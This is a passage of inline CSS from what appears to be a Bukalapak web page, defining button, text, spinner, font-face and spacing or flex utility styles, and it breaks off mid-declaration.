  <style type="text/css">.bl-button{position:relative;display:inline-flex;flex-direction:row;justify-content:center;align-items:center;height:44px;min-width:88px;outline:none;border-radius:4px;cursor:pointer;padding:0 20px;border:1px solid transparent;text-decoration:none;color:#3d3d3d}.bl-button:before{content:""}.bl-button:disabled,.bl-button[aria-disabled]{cursor:not-allowed;pointer-events:none}.bl-button:active .bl-button__icon,.bl-button:active .bl-text{opacity:.6}.bl-button__content,.bl-button__loading{display:flex;align-items:center}.bl-button__loading{position:absolute;flex-direction:row;justify-content:center}.bl-button.is-disabled{cursor:not-allowed}.bl-button.is-disabled .bl-button__icon,.bl-button.is-disabled .bl-text{opacity:.4}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-text{opacity:1}.bl-button.is-fullwidth{width:100%}.bl-button--small{padding:0 12px;height:36px}.bl-button--small.is-icon-only{width:36px!important}.bl-button--extra-small{padding:0 8px;height:28px}.bl-button--extra-small.is-icon-only{width:28px!important}.bl-button--primary{background-color:#e31e52;border-color:transparent}.bl-button--primary:active{background-color:#b3002d}.bl-button--primary:active .bl-button__icon,.bl-button--primary:active .bl-button__text{opacity:.6}.bl-button--primary.is-disabled{background-color:#ff92b2}.bl-button--primary.is-disabled .bl-button__icon,.bl-button--primary.is-disabled .bl-button__text{opacity:.4}.bl-button--secondary{background-color:#f2f2f2;border-color:transparent}.bl-button--secondary:active{background-color:#e0e0e0}.bl-button--secondary:active .bl-button__icon,.bl-button--secondary:active .bl-button__text{opacity:.6}.bl-button--secondary.is-disabled{background-color:#f2f2f2}.bl-button--secondary.is-disabled .bl-button__icon,.bl-button--secondary.is-disabled .bl-button__text{opacity:.4}.bl-button--outline{background-color:#fff;border-color:#d6d6d6}.bl-button--outline:active{background-color:#f2f2f2}.bl-button--outline:active .bl-button__icon,.bl-button--outline:active .bl-button__text{opacity:.6}.bl-button--outline.is-disabled{background-color:#f2f2f2}.bl-button--outline.is-disabled .bl-button__icon,.bl-button--outline.is-disabled .bl-button__text{opacity:.4}.bl-button--naked{background-color:#fff;border-color:transparent}.bl-button--naked:active{background-color:#f2f2f2}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-button__text{opacity:.6}.bl-button--naked.is-disabled{background-color:#fff}.bl-button--naked.is-disabled .bl-button__icon,.bl-button--naked.is-disabled .bl-button__text{opacity:.4}.bl-button--outline-white{background-color:initial;border-color:#d6d6d6}.bl-button--outline-white:active{background-color:initial;border-color:hsla(0,0%,92.2%,.6)}.bl-button--outline-white:active .bl-button__icon,.bl-button--outline-white:active .bl-button__text{opacity:.6}.bl-button--outline-white.is-disabled{background-color:initial;border-color:hsla(0,0%,92.2%,.4)}.bl-button--outline-white.is-disabled .bl-button__icon,.bl-button--outline-white.is-disabled .bl-button__text{opacity:.4}.bl-button--naked-inverse{background-color:initial;border-color:transparent}.bl-button--naked-inverse:active{background-color:initial}.bl-button--naked-inverse:active .bl-button__icon,.bl-button--naked-inverse:active .bl-button__text{opacity:.6}.bl-button--naked-inverse.is-disabled{background-color:initial}.bl-button--naked-inverse.is-disabled .bl-button__icon,.bl-button--naked-inverse.is-disabled .bl-button__text{opacity:.4}.bl-button--link{padding:0!important;height:auto!important;width:auto!important;min-width:auto!important;background:none;border:none}.bl-button--link.is-underline .bl-text{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-button--link:active .bl-text{opacity:1;color:#1c3391}.bl-button--link:active.is-underline .bl-text{background:rgba(20,20,20,.05);color:#3d3d3d}.bl-button--link.is-disabled{cursor:not-allowed}.bl-button--link.is-disabled .bl-text{color:#8badf0}.bl-button--link.is-disabled.is-underline .bl-text{color:#b6b6b6}.bl-button__icon{position:relative;line-height:0}.bl-button__icon.is-right{right:-6px}.bl-button__icon.is-left{left:-6px}.bl-button.is-icon-only{min-width:auto;padding:0;width:44px}.bl-button.is-icon-only .bl-button__icon.is-right{right:0}.bl-button.is-icon-only .bl-button__icon.is-left{left:0}.bl-button--floating-center,.bl-button--floating-left,.bl-button--floating-right{border-radius:500px;background-color:#fff;color:#3d3d3d;font-size:14px;height:56px;min-width:56px;box-shadow:0 2px 4px 0 rgba(0,0,0,.1);position:fixed;border:none;bottom:16px}.bl-button--floating-center.is-icon-only,.bl-button--floating-left.is-icon-only,.bl-button--floating-right.is-icon-only{min-width:56px}.bl-button--floating-center:active,.bl-button--floating-left:active,.bl-button--floating-right:active{background-color:#ebebeb}.bl-button--floating-center:active .bl-button__icon,.bl-button--floating-left:active .bl-button__icon,.bl-button--floating-right:active .bl-button__icon{opacity:.6}.bl-button--floating-center .bl-button__text,.bl-button--floating-left .bl-button__text,.bl-button--floating-right .bl-button__text{font-size:14px}.bl-button--floating-center.bl-button--small,.bl-button--floating-left.bl-button--small,.bl-button--floating-right.bl-button--small{height:40px;min-width:40px;padding:0 16px}.bl-button--floating-center.bl-button--small .bl-button__text,.bl-button--floating-left.bl-button--small .bl-button__text,.bl-button--floating-right.bl-button--small .bl-button__text{font-size:12px}.bl-button--floating-center .bl-icon-default,.bl-button--floating-left .bl-icon-default,.bl-button--floating-right .bl-icon-default{background:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2712%27 height=%2710%27%3E%3Cpath fill=%27%233d3d3d%27 d=%27M11.539.205a1.147 1.147 0 00-1.56.237l-5.19 6.853-2.858-2.794a1.147 1.147 0 00-1.578-.046 1.037 1.037 0 00-.05 1.512s3.474 3.479 3.973 3.828a1.147 1.147 0 001.56-.237l5.95-7.856a1.042 1.042 0 00-.247-1.497z%27/%3E%3C/svg%3E") no-repeat 50%}.bl-button--floating-right{right:16px;left:auto}.bl-button--floating-left{left:16px;right:auto}.bl-button--floating-center{left:50%;right:auto;transform:translateX(-50%)}.bl-button[class*=bl-button--floating]{background-color:#fff}.bl-button[class*=bl-button--floating].is-disabled{background-color:#f2f2f2}.bl-button.bl-button--blue{color:#fff;background-color:#2b4ac7}.bl-button.bl-button--blue:active{background-color:#1c3391}.bl-button.bl-button--blue.is-disabled{background-color:#8badf0}.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:14px;color:#141414;font-weight:400;margin:0;text-decoration:none;line-height:normal}.bl-text.bl-text--ellipsis-1,.bl-text.bl-text--ellipsis-2,.bl-text.bl-text--ellipsis-3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text.bl-text--ellipsis-1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis-2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis-3{-webkit-line-clamp:3}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--body{color:#3d3d3d}.bl-text--heading{color:#141414}.bl-text--white{color:#fff}.bl-text--success{color:#128c55}.bl-text--critical{color:#7a0602}.bl-text--warning{color:#4d2309}.bl-text--error{color:#f42c2c}.bl-text--caption-08{font-size:8px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis-1{max-height:10.4px}.bl-text--caption-08.bl-text--ellipsis-2{max-height:20.8px}.bl-text--caption-08.bl-text--ellipsis-3{max-height:31.2px}.bl-text--caption-10{font-size:10px}.bl-text--caption-10.bl-text--ellipsis-1{max-height:13px}.bl-text--caption-10.bl-text--ellipsis-2{max-height:26px}.bl-text--caption-10.bl-text--ellipsis-3{max-height:39px}.bl-text--caption-12{font-size:12px}.bl-text--caption-12.bl-text--ellipsis-1{max-height:15.6px}.bl-text--caption-12.bl-text--ellipsis-2{max-height:31.2px}.bl-text--caption-12.bl-text--ellipsis-3{max-height:46.8px}.bl-text--body-14{font-size:14px}.bl-text--body-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-long-14{font-size:14px}.bl-text--body-long-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-long-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-long-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-16{font-size:16px}.bl-text--body-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--body-long-16{font-size:16px}.bl-text--body-long-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-long-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-long-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis-1{max-height:23.4px}.bl-text--subheading-18.bl-text--ellipsis-2{max-height:46.8px}.bl-text--subheading-18.bl-text--ellipsis-3{max-height:70.2px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis-1{max-height:26px}.bl-text--subheading-20.bl-text--ellipsis-2{max-height:52px}.bl-text--subheading-20.bl-text--ellipsis-3{max-height:78px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis-1{max-height:31.2px}.bl-text--heading-24.bl-text--ellipsis-2{max-height:62.4px}.bl-text--heading-24.bl-text--ellipsis-3{max-height:93.6px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis-1{max-height:36.4px}.bl-text--heading-28.bl-text--ellipsis-2{max-height:72.8px}.bl-text--heading-28.bl-text--ellipsis-3{max-height:109.2px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis-1{max-height:41.6px}.bl-text--heading-32.bl-text--ellipsis-2{max-height:83.2px}.bl-text--heading-32.bl-text--ellipsis-3{max-height:124.8px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:42px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis-1{max-height:54.6px}.bl-text--heading-42.bl-text--ellipsis-2{max-height:109.2px}.bl-text--heading-42.bl-text--ellipsis-3{max-height:163.8px}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--link-primary{color:#2b4ac7;text-decoration:none}.bl-text--link-primary:active{color:#1c3391}.bl-text--link-primary.bl-text--disabled{color:#8badf0;cursor:not-allowed}.bl-text--link-secondary{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-text--link-secondary:active{background:rgba(20,20,20,.05)}.bl-text--link-secondary.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--link-inverse{color:#fff;text-decoration:underline;text-underline-position:under}.bl-text--link-inverse.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--line-through{text-decoration:line-through}.bl-spinner{position:relative}.bl-spinner__dot{display:inline-block;background:#b6b6b6;height:12px;width:12px;border-radius:100%;margin:1px;animation-name:wormLoad;animation-duration:.6s;animation-iteration-count:infinite;animation-timing-function:ease-in-out;animation-fill-mode:both}.bl-spinner__dot:first-child{animation-delay:.07s}.bl-spinner__dot:nth-child(2){animation-delay:.14s}.bl-spinner__dot:nth-child(3){animation-delay:.21s}.bl-spinner--small .bl-spinner__dot{height:8px;width:8px;animation-name:wormLoadSmall;animation-duration:1.4s;margin:1px}.bl-spinner--small .bl-spinner__dot:first-child{animation-delay:-.24s}.bl-spinner--small .bl-spinner__dot:nth-child(2){animation-delay:-.12s}@keyframes wormLoad{33%{transform:translateY(6px)}66%{transform:translateY(-6px)}to{transform:translateY(0)}}@keyframes wormLoadSmall{0%,80%,to{transform:scale(0)}40%{transform:scale(1)}}</style>
  <style type="text/css">
.pin-js[data-v-781543d7] {
  box-sizing: border-box
}
</style>
  <style type="text/css">
.illust[data-v-2d9f3da4] {
  width: 64px;
  height: 64px;
  background-size: cover;
  background-repeat: no-repeat;
}
</style>
  <style type="text/css">
.bl-callout.custom-callout[data-v-62a96ffc] {
  border: none;
  margin: -24px -24px 0;
  padding: 0 6px;
}
.edit-icon[data-v-62a96ffc] {
  display: inline-block;
  width: 16px;
  height: 16px;
  cursor: pointer;
  background-image: url('https://s3.bukalapak.com/attachment/827212/tfa-js__icon-edit.png');
  vertical-align: top;
}
</style>
  <style type="text/css">html{-moz-box-sizing:border-box;box-sizing:border-box}*,:after,:before{-moz-box-sizing:inherit;box-sizing:inherit}:root{-moz-tab-size:4;tab-size:4}html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}hr{height:0}abbr[title]{-webkit-text-decoration:underline dotted;-moz-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{padding:0}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}a,a:focus,a:hover{text-decoration:none}table{border-collapse:collapse;border-spacing:0}html{font-size:16px;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-ms-text-size-adjust:100%;text-size-adjust:100%}.clearfix{zoom:1}.clearfix:after,.clearfix:before{content:".";display:block;overflow:hidden;visibility:hidden;font-size:0;line-height:0;width:0;height:0}.clearfix:after{clear:both}@font-face{font-family:Buka Sans Display;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Bold-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Bold-v2.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Display;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Medium-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Medium-v2.woff) format("woff");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Bold-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Bold-v2.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Medium-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Medium-v2.woff) format("woff");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Regular-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Regular-v2.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}.p-0{padding:0!important}.p-4{padding:4px!important}.p-8{padding:8px!important}.p-12{padding:12px!important}.p-16{padding:16px!important}.p-20{padding:20px!important}.p-24{padding:24px!important}.p-32{padding:32px!important}.p-48{padding:48px!important}.p-64{padding:64px!important}.pt-0{padding-top:0!important}.pt-4{padding-top:4px!important}.pt-8{padding-top:8px!important}.pt-12{padding-top:12px!important}.pt-16{padding-top:16px!important}.pt-20{padding-top:20px!important}.pt-24{padding-top:24px!important}.pt-32{padding-top:32px!important}.pt-48{padding-top:48px!important}.pt-64{padding-top:64px!important}.pr-0{padding-right:0!important}.pr-4{padding-right:4px!important}.pr-8{padding-right:8px!important}.pr-12{padding-right:12px!important}.pr-16{padding-right:16px!important}.pr-20{padding-right:20px!important}.pr-24{padding-right:24px!important}.pr-32{padding-right:32px!important}.pr-48{padding-right:48px!important}.pr-64{padding-right:64px!important}.pb-0{padding-bottom:0!important}.pb-4{padding-bottom:4px!important}.pb-8{padding-bottom:8px!important}.pb-12{padding-bottom:12px!important}.pb-16{padding-bottom:16px!important}.pb-20{padding-bottom:20px!important}.pb-24{padding-bottom:24px!important}.pb-32{padding-bottom:32px!important}.pb-48{padding-bottom:48px!important}.pb-64{padding-bottom:64px!important}.pl-0{padding-left:0!important}.pl-4{padding-left:4px!important}.pl-8{padding-left:8px!important}.pl-12{padding-left:12px!important}.pl-16{padding-left:16px!important}.pl-20{padding-left:20px!important}.pl-24{padding-left:24px!important}.pl-32{padding-left:32px!important}.pl-48{padding-left:48px!important}.pl-64{padding-left:64px!important}.m-0{margin:0!important}.m-4{margin:4px!important}.m-8{margin:8px!important}.m-12{margin:12px!important}.m-16{margin:16px!important}.m-20{margin:20px!important}.m-24{margin:24px!important}.m-32{margin:32px!important}.m-48{margin:48px!important}.m-64{margin:64px!important}.mt-0{margin-top:0!important}.mt-4{margin-top:4px!important}.mt-8{margin-top:8px!important}.mt-12{margin-top:12px!important}.mt-16{margin-top:16px!important}.mt-20{margin-top:20px!important}.mt-24{margin-top:24px!important}.mt-32{margin-top:32px!important}.mt-48{margin-top:48px!important}.mt-64{margin-top:64px!important}.mr-0{margin-right:0!important}.mr-4{margin-right:4px!important}.mr-8{margin-right:8px!important}.mr-12{margin-right:12px!important}.mr-16{margin-right:16px!important}.mr-20{margin-right:20px!important}.mr-24{margin-right:24px!important}.mr-32{margin-right:32px!important}.mr-48{margin-right:48px!important}.mr-64{margin-right:64px!important}.mb-0{margin-bottom:0!important}.mb-4{margin-bottom:4px!important}.mb-8{margin-bottom:8px!important}.mb-12{margin-bottom:12px!important}.mb-16{margin-bottom:16px!important}.mb-20{margin-bottom:20px!important}.mb-24{margin-bottom:24px!important}.mb-32{margin-bottom:32px!important}.mb-48{margin-bottom:48px!important}.mb-64{margin-bottom:64px!important}.ml-0{margin-left:0!important}.mv-0{margin-top:0!important;margin-bottom:0!important}.pv-0{padding-top:0!important;padding-bottom:0!important}.mh-0{margin-left:0!important;margin-right:0!important}.ph-0{padding-left:0!important;padding-right:0!important}.ml-4{margin-left:4px!important}.mv-4{margin-top:4px!important;margin-bottom:4px!important}.pv-4{padding-top:4px!important;padding-bottom:4px!important}.mh-4{margin-left:4px!important;margin-right:4px!important}.ph-4{padding-left:4px!important;padding-right:4px!important}.ml-8{margin-left:8px!important}.mv-8{margin-top:8px!important;margin-bottom:8px!important}.pv-8{padding-top:8px!important;padding-bottom:8px!important}.mh-8{margin-left:8px!important;margin-right:8px!important}.ph-8{padding-left:8px!important;padding-right:8px!important}.ml-12{margin-left:12px!important}.mv-12{margin-top:12px!important;margin-bottom:12px!important}.pv-12{padding-top:12px!important;padding-bottom:12px!important}.mh-12{margin-left:12px!important;margin-right:12px!important}.ph-12{padding-left:12px!important;padding-right:12px!important}.ml-16{margin-left:16px!important}.mv-16{margin-top:16px!important;margin-bottom:16px!important}.pv-16{padding-top:16px!important;padding-bottom:16px!important}.mh-16{margin-left:16px!important;margin-right:16px!important}.ph-16{padding-left:16px!important;padding-right:16px!important}.ml-20{margin-left:20px!important}.mv-20{margin-top:20px!important;margin-bottom:20px!important}.pv-20{padding-top:20px!important;padding-bottom:20px!important}.mh-20{margin-left:20px!important;margin-right:20px!important}.ph-20{padding-left:20px!important;padding-right:20px!important}.ml-24{margin-left:24px!important}.mv-24{margin-top:24px!important;margin-bottom:24px!important}.pv-24{padding-top:24px!important;padding-bottom:24px!important}.mh-24{margin-left:24px!important;margin-right:24px!important}.ph-24{padding-left:24px!important;padding-right:24px!important}.ml-32{margin-left:32px!important}.mv-32{margin-top:32px!important;margin-bottom:32px!important}.pv-32{padding-top:32px!important;padding-bottom:32px!important}.mh-32{margin-left:32px!important;margin-right:32px!important}.ph-32{padding-left:32px!important;padding-right:32px!important}.ml-48{margin-left:48px!important}.mv-48{margin-top:48px!important;margin-bottom:48px!important}.pv-48{padding-top:48px!important;padding-bottom:48px!important}.mh-48{margin-left:48px!important;margin-right:48px!important}.ph-48{padding-left:48px!important;padding-right:48px!important}.ml-64{margin-left:64px!important}.mv-64{margin-top:64px!important;margin-bottom:64px!important}.pv-64{padding-top:64px!important;padding-bottom:64px!important}.mh-64{margin-left:64px!important;margin-right:64px!important}.ph-64{padding-left:64px!important;padding-right:64px!important}.direction-row{-webkit-flex-direction:row;-moz-box-orient:horizontal;-moz-box-direction:normal;flex-direction:row}.direction-row-reverse{-webkit-flex-direction:row-reverse;-moz-box-orient:horizontal;-moz-box-direction:reverse;flex-direction:row-reverse}.direction-column{-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;flex-direction:column}.direction-column-reverse{-webkit-flex-direction:column-reverse;-moz-box-orient:vertical;-moz-box-direction:reverse;flex-direction:column-reverse}.flex-nowrap{-webkit-flex-wrap:nowrap;flex-wrap:nowrap}.flex-wrap{-webkit-flex-wrap:wrap;flex-wrap:wrap}.flex-wrap-reverse{-webkit-flex-wrap:wrap-reverse;flex-wrap:wrap-reverse}.justify-flex-start{-webkit-justify-content:flex-start;-moz-box-pack:start;justify-content:flex-start}.justify-flex-end{-webkit-justify-content:flex-end;-moz-box-pack:end;justify-content:flex-end}.justify-center{-webkit-justify-content:center;-moz-box-pack:center;justify-content:center}.justify-space-between{-webkit-justify-content:space-between;-moz-box-pack:justify;justify-content:space-between}.justify-space-around{-webkit-justify-content:space-around;justify-content:space-around}.justify-space-evenly{-webkit-justify-content:space-evenly;-moz-box-pack:space-evenly;justify-content:space-evenly}.align-content-flex-start{-webkit-align-content:flex-start;align-content:flex-start}.align-content-flex-end{-webkit-align-content:flex-end;align-content:flex-end}.align-content-center{-webkit-align-content:center;align-content:center}.align-content-space-between{-webkit-align-content:space-between;align-content:space-between}.align-content-space-around{-webkit-align-content:space-around;align-content:space-around}.align-content-stretch{-webkit-align-content:stretch;align-content:stretch}.align-items-flex-start{-webkit-align-items:flex-start;-moz-box-align:start;align-items:flex-start}.align-items-flex-end{-webkit-align-items:flex-end;-moz-box-align:end;align-items:flex-end}.align-items-center{-webkit-align-items:center;-moz-box-align:center;align-items:center}.align-items-stretch{-webkit-align-items:stretch;-moz-box-align:stretch;align-items:stretch}.align-self-flex-start{-webkit-align-self:flex-start;align-self:flex-start}.align-self-flex-end{-webkit-align-self:flex-end;align-self:flex-end}.align-self-center{-webkit-align-self:center;align-self:center}.align-self-stretch{-webkit-align-self:stretch;align-self:stretch}</style>
  <style type="text/css">.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:16px;line-height:1.25;color:#141414;margin:0}.bl-text.bl-text--ellipsis__1{max-height:24px}.bl-text.bl-text--ellipsis__2{max-height:48px}.bl-text.bl-text--ellipsis__3{max-height:72px}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--caption-08{font-size:8px;line-height:12px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis__1{max-height:12px}.bl-text--caption-08.bl-text--ellipsis__2{max-height:24px}.bl-text--caption-08.bl-text--ellipsis__3{max-height:36px}.bl-text--caption-10{font-size:10px;line-height:12px}.bl-text--caption-10.bl-text--ellipsis__1{max-height:15px}.bl-text--caption-10.bl-text--ellipsis__2{max-height:30px}.bl-text--caption-10.bl-text--ellipsis__3{max-height:45px}.bl-text--caption-12{font-size:12px;line-height:16px}.bl-text--caption-12.bl-text--ellipsis__1{max-height:18px}.bl-text--caption-12.bl-text--ellipsis__2{max-height:36px}.bl-text--caption-12.bl-text--ellipsis__3{max-height:54px}.bl-text--body-14{font-size:14px;line-height:20px}.bl-text--body-14.bl-text--ellipsis__1{max-height:21px}.bl-text--body-14.bl-text--ellipsis__2{max-height:42px}.bl-text--body-14.bl-text--ellipsis__3{max-height:63px}.bl-text--body-long-14{font-size:14px;line-height:22px}.bl-text--body-long-14.bl-text--ellipsis__1{max-height:21px}.bl-text--body-long-14.bl-text--ellipsis__2{max-height:42px}.bl-text--body-long-14.bl-text--ellipsis__3{max-height:63px}.bl-text--body-16{font-size:16px;line-height:20px}.bl-text--body-16.bl-text--ellipsis__1{max-height:24px}.bl-text--body-16.bl-text--ellipsis__2{max-height:48px}.bl-text--body-16.bl-text--ellipsis__3{max-height:72px}.bl-text--body-long-16{font-size:16px;line-height:24px}.bl-text--body-long-16.bl-text--ellipsis__1{max-height:24px}.bl-text--body-long-16.bl-text--ellipsis__2{max-height:48px}.bl-text--body-long-16.bl-text--ellipsis__3{max-height:72px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;line-height:22px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis__1{max-height:27px}.bl-text--subheading-18.bl-text--ellipsis__2{max-height:54px}.bl-text--subheading-18.bl-text--ellipsis__3{max-height:81px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;line-height:26px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis__1{max-height:30px}.bl-text--subheading-20.bl-text--ellipsis__2{max-height:60px}.bl-text--subheading-20.bl-text--ellipsis__3{max-height:90px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;line-height:28px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis__1{max-height:36px}.bl-text--heading-24.bl-text--ellipsis__2{max-height:72px}.bl-text--heading-24.bl-text--ellipsis__3{max-height:108px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;line-height:34px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis__1{max-height:42px}.bl-text--heading-28.bl-text--ellipsis__2{max-height:84px}.bl-text--heading-28.bl-text--ellipsis__3{max-height:126px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;line-height:36px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis__1{max-height:48px}.bl-text--heading-32.bl-text--ellipsis__2{max-height:96px}.bl-text--heading-32.bl-text--ellipsis__3{max-height:144px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica 